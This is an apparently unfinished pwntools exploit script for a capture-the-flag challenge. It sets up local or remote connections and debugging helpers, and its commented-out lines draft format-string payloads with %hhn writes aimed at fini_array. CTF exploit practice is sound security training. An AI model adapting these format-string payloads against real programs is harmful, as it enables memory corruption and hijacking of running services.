#!/usr/bin/python3

from pwn import *

exe = ELF('vuln_patched', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+207

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('form.chal.imaginaryctf.org',1337)
else:
        p = process(exe.path)

GDB()
# payload = f"%{0xa0}c%7$hhn".encode()
# fini_array = 0x3d90
# offset = 0x847e

# payload = f"%{0xa0}c%7$hhn".encode()
# payload = payload.ljust(0x10)
# payload += b"%s%s%s%s%s%s%s"
# sl(payload)
p.interactive()
